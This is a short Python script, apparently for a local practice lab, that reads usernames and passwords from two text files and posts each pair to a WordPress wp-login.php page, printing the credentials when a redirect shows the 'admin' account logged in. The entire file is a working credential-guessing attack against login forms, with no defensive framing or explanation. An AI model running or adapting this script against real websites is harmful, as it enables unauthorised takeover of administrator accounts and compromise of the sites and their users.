import requests

wp_login = 'http://localhost/cybersec/wp-login.php'
wp_admin = 'http://localhost/cybersec/wp-admin/'

with open("user.txt", "r") as myUsers:
    username = [i.strip() for i in myUsers]

with open("pass.txt", "r") as myPasses:
    password = [j.strip() for j in myPasses]

for usr,paswrd in zip(username,password):

    with requests.Session() as s:
        headers1 = {'Cookie':'wordpress_test_cookie=1'}

        datas={
            'log':usr,
            'pwd':paswrd,
            'wp-submit':'Log In',
            'redirect_to':wp_admin,
            'testcookie':'1'  
        }

        resp = s.post(wp_login, headers=headers1, data=datas, allow_redirects=False)
       
        if resp.status_code == 302 and usr == "admin":
            print(f"user name is {usr}", end=" ")
            print(f"password is {paswrd}")
            break

